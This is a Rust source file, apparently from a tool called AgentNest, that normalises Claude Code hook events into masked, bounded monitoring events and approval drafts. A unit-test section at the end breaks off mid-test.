//! Claude Code hook normalisation (docs/integrations/claude-code.md 5): hook JSON -> `Vec<RawObservation>`.
//!
//! Pure in the sense that matters: the output depends only on the hook JSON and the [`NormalizeEnv`] (clock, id
//! generator, file-system view), nothing is stored and no decision is taken. Hook JSON is untrusted: missing or odd
//! fields never panic, an input that cannot be attributed to a session yields no observations, and an unknown
//! `hook_event_name` is kept as `notification{notification_type: "unknown_hook:<name>"}` instead of being dropped.
//!
//! The raw hook body is **never** copied into an event: details carry bounded, masked previews only (the masking and
//! bounds are applied by [`build_event`]).

use agentnest_adapter_api::{ApprovalDraft, NativeBinding, RawObservation, SessionMetaPatch};
use agentnest_protocol::canonical::tool_input_sha256;
use agentnest_protocol::{
    AgentEvent, AgentKind, AgentState, CommandClass, Decision, EventKind, Risk, RiskLevel,
    Severity, SourceChannel,
};
use serde_json::{json, Map, Value};
use thiserror::Error;

use crate::normalize::hook::{
    count_field, first_line, int_field, raw_text, str_field, tool_input_with_truncation_marker,
    Hook,
};
use crate::normalize::path;
use crate::normalize::post::{build_event, EventDraft};
use crate::normalize::NormalizeEnv;
use crate::redact::{clip, tail_bytes};
use crate::risk::classify::{classify, command_text};
use crate::risk::command_class::{command_class_for, runner};
use crate::risk::tokenizer::Shell;
use crate::state::timers::format_ms;
use crate::summarize::ko::{self, ToolObservation};

/// Raw stdout/stderr tail handed to the post-processing (it keeps 1 KiB after masking).
const RAW_TAIL_BYTES: usize = 4 * 1024;
/// At most this many `bashEditDiff.changedFiles` become `file_modified` events.
const MAX_BASH_EDIT_FILES: usize = 5;

/// Context of a normalisation call.
#[derive(Clone, Debug)]
pub struct NormalizeCtx<'a> {
    /// Clock, ids and project resolution.
    pub env: &'a NormalizeEnv,
    /// `claude_code.hook.http` (default) or `claude_code.hook.cli` (the `agentnest-hook` fallback).
    pub channel: SourceChannel,
}

impl<'a> NormalizeCtx<'a> {
    /// A context for the HTTP hook channel.
    pub fn http(env: &'a NormalizeEnv) -> Self {
        Self {
            env,
            channel: SourceChannel::ClaudeCodeHookHttp,
        }
    }

    /// A context for the command-hook (CLI) channel.
    pub fn cli(env: &'a NormalizeEnv) -> Self {
        Self {
            env,
            channel: SourceChannel::ClaudeCodeHookCli,
        }
    }
}

/// Why a draft could not be built.
#[derive(Debug, Error, PartialEq, Eq)]
pub enum NormalizeError {
    /// The input is not a hook (no object, no `hook_event_name` or no `session_id`).
    #[error("not a hook input")]
    NotAHook,
    /// The hook is not a `PermissionRequest`.
    #[error("not a PermissionRequest")]
    NotPermissionRequest,
    /// A `PermissionRequest` without `tool_name`.
    #[error("PermissionRequest without tool_name")]
    MissingToolName,
}

/// The `hook_event_name` of a hook input.
pub fn hook_event_name(hook: &Value) -> Option<&str> {
    str_field(hook, "hook_event_name")
}

struct Out<'a> {
    ctx: &'a NormalizeCtx<'a>,
    items: Vec<RawObservation>,
}

impl Out<'_> {
    fn push(&mut self, draft: EventDraft) {
        let ev: AgentEvent = build_event(draft, self.ctx.env);
        self.items.push(RawObservation::Event(ev));
    }
}

/// Normalises one hook input. `PermissionRequest` yields **no** observations here: it is an approval, built with
/// [`permission_request_draft`] and paired with a responder by the HTTP layer.
pub fn normalize(hook: &Value, ctx: &NormalizeCtx<'_>) -> Vec<RawObservation> {
    let Some(h) = Hook::parse(hook) else {
        return Vec::new();
    };
    let mut out = Out {
        ctx,
        items: Vec::new(),
    };
    match h.event_name {
        "SessionStart" => session_start(&h, &mut out),
        "UserPromptSubmit" => user_prompt_submit(&h, &mut out),
        "PreToolUse" => pre_tool_use(&h, &mut out),
        "PermissionRequest" => {}
        "PermissionDenied" => permission_denied(&h, &mut out),
        "PostToolUse" => post_tool_use(&h, &mut out),
        "PostToolUseFailure" => post_tool_use_failure(&h, &mut out),
        "Notification" => notification(&h, &mut out),
        "SubagentStart" => subagent(&h, &mut out, true),
        "SubagentStop" => subagent(&h, &mut out, false),
        "Stop" => stop(&h, &mut out),
        "StopFailure" => stop_failure(&h, &mut out),
        "TaskCreated" => task(&h, &mut out, true),
        "TaskCompleted" => task(&h, &mut out, false),
        "PostCompact" => post_compact(&h, &mut out),
        "SessionEnd" => session_end(&h, &mut out),
        other => unknown_hook(&h, &mut out, other),
    }
    out.items
}

fn draft(h: &Hook<'_>, out: &Out<'_>, kind: EventKind) -> EventDraft {
    h.draft(AgentKind::ClaudeCode, out.ctx.channel.clone(), kind)
}

fn is_shell_tool(lower: &str) -> bool {
    matches!(lower, "bash" | "powershell")
}

fn shell_of(lower: &str) -> Shell {
    if lower == "powershell" {
        Shell::PowerShell
    } else {
        Shell::Posix
    }
}

fn is_write_tool(lower: &str) -> bool {
    matches!(lower, "write" | "edit" | "multiedit" | "notebookedit")
}

fn tool_path(ti: &Value) -> Option<String> {
    ["file_path", "notebook_path", "path"]
        .iter()
        .find_map(|k| str_field(ti, k))
        .map(str::to_owned)
}

fn with_input_hash(d: &mut EventDraft, h: &Hook<'_>) {
    // Lets the approval correlator match PreToolUse/PostToolUse to a PermissionRequest (same tool + same input).
    if h.tool_input.is_object() {
        d.native_ids.insert(
            "tool_input_sha256".to_owned(),
            tool_input_sha256(h.tool_input),
        );
    }
}

fn session_meta(h: &Hook<'_>, out: &mut Out<'_>, title: Option<&str>, model: Option<&str>) {
    if h.permission_mode.is_none() && title.is_none() && model.is_none() {
        return;
    }
    out.items.push(RawObservation::SessionMeta {
        session_key: format!("claude_code:{}", clip(h.session_id, 128)),
        patch: SessionMetaPatch {
            title: title.map(str::to_owned),
            model: model.map(str::to_owned),
            permission_mode: h.permission_mode.map(str::to_owned),
            ..Default::default()
        },
    });
}

fn map(v: Value) -> Map<String, Value> {
    match v {
        Value::Object(m) => m,
        _ => Map::new(),
    }
}

// -- lifecycle ---------------------------------------------------------------------------------------------------------

fn session_start(h: &Hook<'_>, out: &mut Out<'_>) {
    let source = str_field(h.raw, "source")
        .filter(|s| matches!(*s, "startup" | "resume" | "clear" | "compact" | "fork"))
        .unwrap_or("startup");
    let model = str_field(h.raw, "model");
    let title = str_field(h.raw, "session_title");
    let mut d = draft(h, out, EventKind::SessionStarted);
    d.headline = ko::session_started_headline(source);
    d.state_hint = matches!(source, "startup" | "clear").then_some(AgentState::Idle);
    let mut detail = json!({ "source_reason": source });
    if let Some(m) = model {
        detail["model"] = json!(m);
    }
    if let Some(p) = h.permission_mode {
        detail["permission_mode"] = json!(p);
    }
    if let Some(t) = title {
        detail["title"] = json!(t);
    }
    d.detail = map(detail);
    out.push(d);
    session_meta(h, out, title, model);
}

fn session_end(h: &Hook<'_>, out: &mut Out<'_>) {
    let mut d = draft(h, out, EventKind::SessionEnded);
    d.headline = ko::session_ended_headline();
    d.detail = map(json!({ "reason": str_field(h.raw, "reason").unwrap_or("other") }));
    out.push(d);
}

fn user_prompt_submit(h: &Hook<'_>, out: &mut Out<'_>) {
    let prompt = raw_text(h.raw, "prompt").unwrap_or_default();
    let prompt_len = h
        .raw
        .get("prompt")
        .and_then(Value::as_str)
        .map(|s| s.chars().count())
        .unwrap_or(0);
    // Heuristic (claude-code.md 5, Phase 0 A11): scheduled / background turns do not start with a person's text.
    let trimmed = prompt.trim_start();
    let lower = trimmed.to_lowercase();
    let auto_turn_suspect = trimmed.starts_with('<')
        || trimmed.starts_with('[')
        || lower.starts_with("scheduled")
        || lower.starts_with("background");
    let masked_preview =
        crate::redact::mask_and_clip(&prompt, crate::redact::PROMPT_PREVIEW_MAX_CHARS).text;
    let (headline, summary_detail) = ko::prompt_submitted_summary(&masked_preview);
    let mut d = draft(h, out, EventKind::PromptSubmitted);
    d.headline = headline;
    d.summary_detail = summary_detail;
    d.state_hint = Some(AgentState::Working);
    d.detail = map(json!({
        "prompt_preview": prompt, // raw (bounded); the post-processing masks it and cuts it to 200 characters
        "prompt_len": prompt_len,
        "auto_turn_suspect": auto_turn_suspect,
    }));
    out.push(d);
    session_meta(h, out, None, None);
}

// -- tools -------------------------------------------------------------------------------------------------------------

fn summarize<'a>(
    h: &Hook<'a>,
    tool: &'a str,
    class: Option<CommandClass>,
    file_exists: Option<bool>,
) -> ko::ToolSummary {
    ko::summarize_tool(&ToolObservation {
        agent_kind: AgentKind::ClaudeCode,
        tool_name: tool,
        tool_input: h.tool_input,
        cwd: h.cwd,
        command_class: class,
        file_exists,
        permission_request: false,
    })
}

fn mcp_server_name(h: &Hook<'_>, tool: &str) -> Option<String> {
    match h.raw.get("mcp_server") {
        Some(Value::Object(o)) => o.get("name").and_then(Value::as_str).map(str::to_owned),
        Some(Value::String(s)) if !s.is_empty() => Some(s.clone()),
        _ => tool
            .strip_prefix("mcp__")
            .and_then(|r| r.split("__").next())
            .filter(|s| !s.is_empty())
            .map(str::to_owned),
    }
}

fn tool_input_summary(lower: &str, tool: &str, ti: &Value) -> String {
    match lower {
        "webfetch" => ti
            .get("url")
            .and_then(Value::as_str)
            .and_then(ko::url_host)
            .unwrap_or_default(),
        "websearch" => str_field(ti, "query")
            .map(|q| clip(q, 60))
            .unwrap_or_default(),
        "agent" | "task" => str_field(ti, "description")
            .map(|q| clip(q, 60))
            .unwrap_or_default(),
        _ if is_write_tool(lower) => tool_path(ti)
            .map(|p| path::basename(&p).to_owned())
            .unwrap_or_default(),
        _ if tool.starts_with("mcp__") => tool.to_owned(),
        _ => String::new(),
    }
}

fn pre_tool_use(h: &Hook<'_>, out: &mut Out<'_>) {
    let tool = h.tool_name.unwrap_or("");
    let lower = tool.to_ascii_lowercase();
    let ti = h.tool_input;
    if is_shell_tool(&lower) {
        let command = command_text(ti);
        let shell = shell_of(&lower);
        let class = command_class_for(&command, shell);
        let s = summarize(h, tool, Some(class.clone()), None);
        let testing = matches!(class, CommandClass::Test | CommandClass::Build);
        let mut detail = json!({
            "tool_name": tool,
            "command": crate::redact::head_bytes(&command, crate::normalize::hook::RAW_TEXT_MAX_BYTES).0,
            "command_class": class.as_str(),
            "cwd_hint": h.cwd.unwrap_or(""),
            "run_in_background": ti.get("run_in_background").and_then(Value::as_bool).unwrap_or(false),
        });
        if let Some(desc) = str_field(ti, "description") {
            detail["description"] = json!(desc);
        }
        let mut d = draft(h, out, EventKind::CommandStarted);
        d.headline = s.headline.clone();
        d.summary_detail = s.detail.clone();
        d.state_hint = Some(if testing {
            AgentState::Testing
        } else {
            AgentState::Working
        });
        d.detail = map(detail.clone());
        with_input_hash(&mut d, h);
        out.push(d);
        if class == CommandClass::Test {
            detail["runner"] =
                json!(runner(&command, shell).unwrap_or_else(|| "unknown".to_owned()));
            let mut t = draft(h, out, EventKind::TestRun);
            t.headline = s.headline;
            t.summary_detail = s.detail;
            t.state_hint = Some(AgentState::Testing);
            t.detail = map(detail);
            with_input_hash(&mut t, h);
            out.push(t);
        }
        return;
    }
    if is_write_tool(&lower) {
        let p = tool_path(ti).unwrap_or_default();
        let exists = (lower == "write" && !p.is_empty()).then(|| {
            let full = path::resolve(&p, h.cwd);
            out.ctx.env.projects.path_exists(&full)
        });
        let s = summarize(h, tool, None, exists);
        let op = match lower.as_str() {
            "write" => "write",
            _ => "edit",
        };
        let mut d = draft(h, out, EventKind::ToolStarted);
        d.headline = s.headline;
        d.summary_detail = s.detail;
        d.state_hint = Some(AgentState::WritingCode);
        d.detail = map(json!({
            "tool_name": tool,
            "tool_input_summary": tool_input_summary(&lower, tool, ti),
            "file_path": p,
            "op": op,
        }));
        with_input_hash(&mut d, h);
        out.push(d);
        return;
    }
    if matches!(lower.as_str(), "read" | "grep" | "glob") {
        let s = summarize(h, tool, None, None);
        let file_path = tool_path(ti)
            .or_else(|| h.cwd.map(str::to_owned))
            .unwrap_or_default();
        let mut detail = json!({ "tool_name": tool, "file_path": file_path });
        if let Some(p) = str_field(ti, "pattern") {
            detail["pattern"] = json!(p);
        }
        let mut d = draft(h, out, EventKind::FileRead);
        d.headline = s.headline;
        d.summary_detail = s.detail;
        d.state_hint = Some(AgentState::Reviewing);
        d.detail = map(detail);
        with_input_hash(&mut d, h);
        out.push(d);
        return;
    }
    // Agent, WebFetch, WebSearch, mcp__*, TodoWrite, ... and anything unknown
    let s = summarize(h, tool, None, None);
    let mut detail = json!({
        "tool_name": tool,
        "tool_input_summary": tool_input_summary(&lower, tool, ti),
    });
    if let Some(m) = mcp_server_name(h, tool) {
        detail["mcp_server"] = json!(m);
    }
    let mut d = draft(h, out, EventKind::ToolStarted);
    d.headline = s.headline;
    d.summary_detail = s.detail;
    d.state_hint = Some(AgentState::Working);
    d.detail = map(detail);
    with_input_hash(&mut d, h);
    out.push(d);
}

fn permission_denied(h: &Hook<'_>, out: &mut Out<'_>) {
    let tool = h.tool_name.unwrap_or("");
    let mut d = draft(h, out, EventKind::PermissionDeniedAuto);
    d.headline = ko::permission_denied_headline(tool);
    d.summary_detail = str_field(h.raw, "reason").map(str::to_owned);
    d.detail =
        map(json!({ "tool_name": tool, "reason": str_field(h.raw, "reason").unwrap_or("") }));
    with_input_hash(&mut d, h);
    out.push(d);
}

fn post_tool_use(h: &Hook<'_>, out: &mut Out<'_>) {
    let tool = h.tool_name.unwrap_or("");
    let lower = tool.to_ascii_lowercase();
    let ti = h.tool_input;
    let resp = h.raw.get("tool_response").unwrap_or(&Value::Null);
    let duration = int_field(h.raw, "duration_ms");
    if is_write_tool(&lower) {
        let p = tool_path(ti).unwrap_or_default();
        let op = match (lower.as_str(), resp.get("type").and_then(Value::as_str)) {
            ("write", Some("create")) => "create",
            ("write", _) => "update",
            _ => "edit",
        };
        let mut detail = json!({ "file_path": p, "op": op });
        if let Some(ms) = duration {
            detail["duration_ms"] = json!(ms);
        }
        let mut d = draft(h, out, EventKind::FileModified);
        d.headline = ko::file_modified_headline(&p, op);
        d.state_hint = Some(AgentState::WritingCode);
        d.detail = map(detail);
        with_input_hash(&mut d, h);
        out.push(d);
        return;
    }
    if is_shell_tool(&lower) {
        let command = command_text(ti);
        let shell = shell_of(&lower);
        let class = command_class_for(&command, shell);
        let interrupted = resp
            .get("interrupted")
            .and_then(Value::as_bool)
            .unwrap_or(false);
        let stdout = resp
            .get("stdout")
            .and_then(Value::as_str)
            .map(|s| tail_bytes(s, RAW_TAIL_BYTES).0);
        let stderr = resp
            .get("stderr")
            .and_then(Value::as_str)
            .map(|s| tail_bytes(s, RAW_TAIL_BYTES).0);
        let exit_code = if interrupted { None } else { Some(0i64) };
        let mut detail = json!({
            "tool_name": tool,
            "command": crate::redact::head_bytes(&command, crate::normalize::hook::RAW_TEXT_MAX_BYTES).0,
            "command_class": class.as_str(),
        });
        if let Some(c) = exit_code {
            detail["exit_code"] = json!(c);
        }
        if let Some(ms) = duration {
            detail["duration_ms"] = json!(ms);
        }
        if let Some(s) = stdout.filter(|s| !s.is_empty()) {
            detail["stdout_tail"] = json!(s);
        }
        if let Some(s) = stderr.filter(|s| !s.is_empty()) {
            detail["stderr_tail"] = json!(s);
        }
        let mut d = draft(h, out, EventKind::CommandCompleted);
        d.headline = ko::command_completed_headline(&class, exit_code);
        d.detail = map(detail.clone());
        with_input_hash(&mut d, h);
        out.push(d);
        if class == CommandClass::Test && !interrupted {
            detail["runner"] =
                json!(runner(&command, shell).unwrap_or_else(|| "unknown".to_owned()));
            let mut t = draft(h, out, EventKind::TestPassed);
            t.headline = ko::command_completed_headline(&class, Some(0));
            t.detail = map(detail);
            with_input_hash(&mut t, h);
            out.push(t);
        }
        // Files that a shell command changed (v2.1.269+). The element shape is not documented: strings and objects with
        // a path key are accepted.
        let changed = resp
            .get("bashEditDiff")
            .and_then(|b| b.get("changedFiles"))
            .and_then(Value::as_array)
            .cloned()
            .unwrap_or_default();
        for f in changed.iter().take(MAX_BASH_EDIT_FILES) {
            let p = f.as_str().or_else(|| {
                ["path", "file_path", "filePath"]
                    .iter()
                    .find_map(|k| f.get(*k).and_then(Value::as_str))
            });
            if let Some(p) = p {
                let mut m = draft(h, out, EventKind::FileModified);
                m.headline = ko::file_modified_headline(p, "update");
                m.state_hint = Some(AgentState::WritingCode);
                m.detail = map(json!({ "file_path": p, "op": "update", "via": "bash" }));
                with_input_hash(&mut m, h);
                out.push(m);
            }
        }
        return;
    }
    let mut detail = json!({ "tool_name": tool });
    if let Some(ms) = duration {
        detail["duration_ms"] = json!(ms);
    }
    if let Some(status) = resp.get("status").and_then(Value::as_str) {
        detail["result_summary"] = json!(status);
    }
    let mut d = draft(h, out, EventKind::ToolCompleted);
    d.headline = ko::tool_completed_headline(tool);
    d.detail = map(detail);
    with_input_hash(&mut d, h);
    out.push(d);
}

fn post_tool_use_failure(h: &Hook<'_>, out: &mut Out<'_>) {
    let tool = h.tool_name.unwrap_or("");
    let lower = tool.to_ascii_lowercase();
    let error_full = h.raw.get("error").and_then(Value::as_str).unwrap_or("");
    let error_line = first_line(error_full).to_owned();
    let is_interrupt = h
        .raw
        .get("is_interrupt")
        .and_then(Value::as_bool)
        .unwrap_or(false);
    let (headline, summary_detail) = ko::post_tool_failure_summary(tool, error_full, is_interrupt);
    let severity = if is_interrupt {
        Severity::Info
    } else {
        Severity::Warning
    };
    if is_shell_tool(&lower) {
        let command = command_text(h.tool_input);
        let shell = shell_of(&lower);
        let class = command_class_for(&command, shell);
        let exit = ko::parse_exit_code(error_full);
        let mut detail = json!({
            "tool_name": tool,
            "command": crate::redact::head_bytes(&command, crate::normalize::hook::RAW_TEXT_MAX_BYTES).0,
            "command_class": class.as_str(),
            "error": error_line,
            "is_interrupt": is_interrupt,
        });
        if let Some(c) = exit {
            detail["exit_code"] = json!(c);
        }
        let mut d = draft(h, out, EventKind::CommandFailed);
        d.severity = severity;
        d.headline = headline.clone();
        d.summary_detail = summary_detail.clone();
        d.state_hint = Some(AgentState::Error);
        d.detail = map(detail.clone());
        with_input_hash(&mut d, h);
        out.push(d);
        if class == CommandClass::Test && !is_interrupt {
            detail["runner"] =
                json!(runner(&command, shell).unwrap_or_else(|| "unknown".to_owned()));
            let mut t = draft(h, out, EventKind::TestFailed);
            t.headline = ko::command_completed_headline(&class, Some(exit.unwrap_or(1)));
            t.summary_detail = summary_detail;
            t.state_hint = Some(AgentState::Error);
            t.detail = map(detail);
            with_input_hash(&mut t, h);
            out.push(t);
        }
        return;
    }
    let mut d = draft(h, out, EventKind::ToolFailed);
    d.severity = severity;
    d.headline = headline;
    d.summary_detail = summary_detail;
    d.state_hint = Some(AgentState::Error);
    d.detail = map(json!({ "tool_name": tool, "error": error_line, "is_interrupt": is_interrupt }));
    with_input_hash(&mut d, h);
    out.push(d);
}

// -- notifications and session flow ------------------------------------------------------------------------------------

fn notification(h: &Hook<'_>, out: &mut Out<'_>) {
    let nt = str_field(h.raw, "notification_type").unwrap_or("unknown");
    let message = raw_text(h.raw, "message").unwrap_or_default();
    if nt == "idle_prompt" {
        // ~60 s without input after a response (claude-code.md 5.8)
        let mut d = draft(h, out, EventKind::Idle);
        d.headline = ko::notification_headline(nt);
        d.state_hint = Some(AgentState::Idle);
        d.detail = map(json!({ "idle_seconds": 60 }));
        out.push(d);
        return;
    }
    // `permission_prompt` stays a `notification`: the reducer turns it into `awaiting_approval` when no approval is
    // pending (protocol.md 5.4). It must not become an `approval_requested` event: no `approval_resolved` would ever
    // close it.
    let mut detail = json!({ "notification_type": nt, "message": message });
    if let Some(t) = str_field(h.raw, "title") {
        detail["title"] = json!(t);
    }
    let mut d = draft(h, out, EventKind::Notification);
    d.headline = ko::notification_headline(nt);
    d.summary_detail = Some(message).filter(|m| !m.is_empty());
    d.state_hint = match nt {
        "permission_prompt" => Some(AgentState::AwaitingApproval),
        "agent_needs_input" => Some(AgentState::AwaitingInput),
        _ => None,
    };
    d.severity = if matches!(nt, "permission_prompt" | "agent_needs_input") {
        Severity::Notice
    } else {
        Severity::Info
    };
    d.detail = map(detail);
    out.push(d);
}

fn subagent(h: &Hook<'_>, out: &mut Out<'_>, started: bool) {
    let kind = if started {
        EventKind::SubagentStarted
    } else {
        EventKind::SubagentStopped
    };
    let agent_type = h.agent_type.unwrap_or("");
    let mut detail = json!({ "agent_id": h.agent_id.unwrap_or(""), "agent_type": agent_type });
    if !started {
        if let Some(m) = raw_text(h.raw, "last_assistant_message") {
            detail["final_message_preview"] = json!(m);
        }
    }
    let mut d = draft(h, out, kind);
    d.headline = ko::subagent_headline(started, agent_type);
    d.detail = map(detail);
    out.push(d);
}

fn stop(h: &Hook<'_>, out: &mut Out<'_>) {
    let bg = count_field(h.raw, "background_tasks");
    let crons = count_field(h.raw, "session_crons");
    let last = raw_text(h.raw, "last_assistant_message");
    let (headline, summary_detail) = ko::stop_summary(bg, last.as_deref());
    let mut detail = json!({ "background_tasks": bg, "session_crons": crons });
    if let Some(m) = last {
        detail["final_message_preview"] = json!(m);
    }
    let mut d = draft(h, out, EventKind::TurnCompleted);
    d.headline = headline;
    d.summary_detail = summary_detail;
    d.state_hint = Some(if bg == 0 {
        AgentState::Completed
    } else {
        AgentState::Working
    });
    d.detail = map(detail);
    out.push(d);
}

fn stop_failure(h: &Hook<'_>, out: &mut Out<'_>) {
    let error = str_field(h.raw, "error").unwrap_or("unknown");
    let mut detail = json!({ "error_code": error });
    if let Some(m) =
        raw_text(h.raw, "error_details").or_else(|| raw_text(h.raw, "last_assistant_message"))
    {
        detail["error_message"] = json!(m);
    }
    let mut d = draft(h, out, EventKind::TurnFailed);
    d.headline = ko::stop_failure_headline(error);
    d.state_hint = Some(AgentState::Error);
    d.detail = map(detail);
    out.push(d);
}

fn task(h: &Hook<'_>, out: &mut Out<'_>, created: bool) {
    let subject = str_field(h.raw, "task_subject").unwrap_or("");
    let kind = if created {
        EventKind::TaskCreated
    } else {
        EventKind::TaskCompleted
    };
    let mut d = draft(h, out, kind);
    d.headline = ko::task_headline(created, subject);
    d.detail = map(json!({
        "task_id": str_field(h.raw, "task_id").unwrap_or(""),
        "task_subject": subject,
    }));
    out.push(d);
}

fn post_compact(h: &Hook<'_>, out: &mut Out<'_>) {
    let mut detail = json!({ "trigger": str_field(h.raw, "trigger").unwrap_or("auto") });
    if let Some(s) = raw_text(h.raw, "compact_summary") {
        detail["summary_preview"] = json!(s);
    }
    let mut d = draft(h, out, EventKind::ContextCompacted);
    d.headline = ko::context_compacted_headline();
    d.detail = map(detail);
    out.push(d);
}

fn unknown_hook(h: &Hook<'_>, out: &mut Out<'_>, name: &str) {
    let safe: String = name
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '_')
        .take(48)
        .collect();
    let nt = format!("unknown_hook:{safe}");
    let mut d = draft(h, out, EventKind::Notification);
    d.headline = ko::notification_headline(&nt);
    d.detail = map(json!({ "notification_type": nt, "message": "" }));
    out.push(d);
}

// -- permission request and PreToolUse risk ---------------------------------------------------------------------------

/// Builds the description of a `PermissionRequest` for the approval broker. The raw `tool_input` stays in memory only
/// (the draft's `Debug` hides it). **No decision is made here.**
pub fn permission_request_draft(
    hook: &Value,
    ctx: &NormalizeCtx<'_>,
) -> Result<ApprovalDraft, NormalizeError> {
    let h = Hook::parse(hook).ok_or(NormalizeError::NotAHook)?;
    if h.event_name != "PermissionRequest" {
        return Err(NormalizeError::NotPermissionRequest);
    }
    let tool = h.tool_name.ok_or(NormalizeError::MissingToolName)?;
    let suggestions = hook
        .get("permission_suggestions")
        .and_then(Value::as_array)
        .map(|a| a.len() as u32);
    let mut ids = std::collections::BTreeMap::new();
    ids.insert("tool_name".to_owned(), tool.to_owned());
    ids.insert(
        "tool_input_sha256".to_owned(),
        tool_input_sha256(h.tool_input),
    );
    if let Some(p) = h.prompt_id {
        ids.insert("prompt_id".to_owned(), p.to_owned());
    }
    Ok(ApprovalDraft {
        binding: NativeBinding {
            agent_kind: AgentKind::ClaudeCode,
            native_session_id: h.session_id.to_owned(),
            ids,
        },
        session_key: format!("claude_code:{}", h.session_id),
        agent_kind: AgentKind::ClaudeCode,
        agent_id: h.agent_id.map(str::to_owned),
        project: h.cwd.map(|c| ctx.env.projects.resolve(c)),
        cwd: h.cwd.map(str::to_owned),
        tool_name: tool.to_owned(),
        // a cut input (CLI relay) carries the truncation marker, which makes the classifier say `critical`
        tool_input: tool_input_with_truncation_marker(h.tool_input, hook),
        origin: ctx.channel.clone(),
        permission_mode: h.permission_mode.map(str::to_owned),
        available_decisions: vec![Decision::Allow, Decision::Deny, Decision::DenyAndStop],
        permission_suggestions_count: suggestions,
        agent_description: str_field(h.tool_input, "description").map(str::to_owned),
        reason: None,
        created_at: format_ms(ctx.env.clock.now_ms()),
    })
}

/// Classifies the tool call of a `PreToolUse` hook (the risk path of docs/integrations/claude-code.md 4.1). `None` if the
/// input is not a `PreToolUse` hook.
pub fn pre_tool_use_risk(hook: &Value) -> Option<Risk> {
    let h = Hook::parse(hook)?;
    if h.event_name != "PreToolUse" {
        return None;
    }
    Some(classify(
        h.tool_name.unwrap_or(""),
        &tool_input_with_truncation_marker(h.tool_input, hook),
        h.cwd,
        h.permission_mode,
    ))
}

/// The only reply a `PreToolUse` hook may get from AgentNest: `ask` for a critical call when `force_ask_on_critical` is
/// on. **Never `allow`** (a hook `allow` could skip a prompt the user would have seen; claude-code.md 4.1). `None`
/// means "no opinion" (an empty 204).
pub fn pre_tool_use_ask_reply(risk: &Risk, force_ask_on_critical: bool) -> Option<Value> {
    if force_ask_on_critical && risk.level.effective() == RiskLevel::Critical {
        Some(json!({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "ask",
                "permissionDecisionReason": "AgentNest: 위험 명령은 확인이 필요합니다",
            }
        }))
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::normalize::project::testing::FakeFs;
    use crate::normalize::{ProjectResolver, SequentialIdGen};
    use crate::state::timers::ManualClock;
    use agentnest_protocol::ExtraConfirmation;
    use std::sync::Arc;

    fn env() -> NormalizeEnv {
        let clock = Arc::new(ManualClock::new(1_792_055_553_120));
        NormalizeEnv::new(
            clock.clone(),
            Arc::new(SequentialIdGen::default()),
            Arc::new(ProjectResolver::with_probe(
                Box::new(FakeFs::default()),
                clock,
            )),
        )
    }

    fn events(hook: Value) -> Vec<AgentEvent> {
        let env = env();
        normalize(&hook, &NormalizeCtx::http(&env))
            .into_iter()
            .filter_map(|o| match o {
                RawObservation::Event(e) => Some(e),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn unattributable_inputs_yield_nothing() {
        let env = env();
        let ctx = NormalizeCtx::http(&env);
        for v in [
            json!(null),
            json!(5),
            json!([]),
            json!({}),
            json!({"hook_event_name": "Stop"}),
            json!({"session_id": "s"}),
        ] {
            assert!(normalize(&v, &ctx).is_empty(), "{v}");
        }
        // PermissionRequest is an approval, not an observation
        let pr = json!({"hook_event_name": "PermissionRequest", "session_id": "s", "tool_name": "Bash", "tool_input": {"command": "ls"}});
        assert!(normalize(&pr, &ctx).is_empty());
    }

    #[test]
    fn unknown_hook_events_are_kept_as_notifications() {
        let evs = events(json!({"hook_event_name": "FutureEvent\n<x>", "session_id": "s"}));
        assert_eq!(evs.len(), 1);
        assert_eq!(evs[0].kind, EventKind::Notification);
        assert_eq!(
            evs[0].detail["notification_type"],
            "unknown_hook:FutureEventx"
        );
    }

    #[test]
    fn test_commands_emit_command_started_and_test_run() {
        let evs = events(
            json!({"hook_event_name": "PreToolUse", "session_id": "s", "cwd": "C:\\dev\\agentnest", "tool_name": "Bash", "tool_use_id": "t1",
            "tool_input": {"command": "cd desktop && cargo test -p core", "description": "Run core tests"}}),
        );
        let kinds: Vec<&str> = evs.iter().map(|e| e.kind.as_str()).collect();
        assert_eq!(kinds, vec!["command_started", "test_run"]);
        assert_eq!(evs[0].detail["command_class"], "test");
        assert_eq!(evs[1].detail["runner"], "cargo");
        assert_eq!(evs[0].state_hint, Some(AgentState::Testing));
        assert_eq!(
            evs[0].summary.headline,
            "테스트를 돌리고 있어요 (cargo test -p core)"
        );
        assert!(evs[0].source.native_ids.contains_key("tool_input_sha256"));
        assert_eq!(evs[0].source.native_ids["tool_use_id"], "t1");
    }

    #[test]
    fn failed_test_run_emits_command_failed_and_test_failed_and_interrupts_are_not_errors() {
        let evs = events(
            json!({"hook_event_name": "PostToolUseFailure", "session_id": "s", "tool_name": "Bash",
            "tool_input": {"command": "cargo test"}, "error": "Exit code 101\nerror[E0432]", "is_interrupt": false}),
        );
        let kinds: Vec<&str> = evs.iter().map(|e| e.kind.as_str()).collect();
        assert_eq!(kinds, vec!["command_failed", "test_failed"]);
        assert_eq!(evs[0].detail["exit_code"], 101);
        assert_eq!(evs[0].summary.headline, "명령이 실패했어요 (exit 101)");
        let evs = events(
            json!({"hook_event_name": "PostToolUseFailure", "session_id": "s", "tool_name": "Bash",
            "tool_input": {"command": "cargo test"}, "error": "Exit code 130", "is_interrupt": true}),
        );
        assert_eq!(evs.len(), 1, "an interrupted test run is not a failed test");
        assert_eq!(evs[0].severity, Severity::Info);
        assert_eq!(evs[0].detail["is_interrupt"], true);
    }

    #[test]
    fn prompt_events_never_carry_the_full_prompt_or_secrets() {
        let prompt = format!("deploy with token=hunter2 {}", "blah ".repeat(500));
        let evs = events(
            json!({"hook_event_name": "UserPromptSubmit", "session_id": "s", "prompt": prompt}),
        );
        let e = &evs[0];
        let preview = e.detail["prompt_preview"].as_str().unwrap();
        assert!(preview.chars().count() <= 200);
        assert!(!preview.contains("hunter2"));
        assert!(e.redacted);
        assert_eq!(e.detail["prompt_len"], prompt.chars().count());
        assert!(!serde_json::to_string(e).unwrap().contains("hunter2"));
        for (p, want) in [
            ("<task-notification>x", true),
            ("[scheduled] run", true),
            ("Scheduled job", true),
            ("fix the bug", false),
        ] {
            let evs = events(
                json!({"hook_event_name": "UserPromptSubmit", "session_id": "s", "prompt": p}),
            );
            assert_eq!(evs[0].detail["auto_turn_suspect"], want, "{p}");
        }
    }

    #[test]
    fn stop_counts_background_tasks_and_crons() {
        let evs = events(
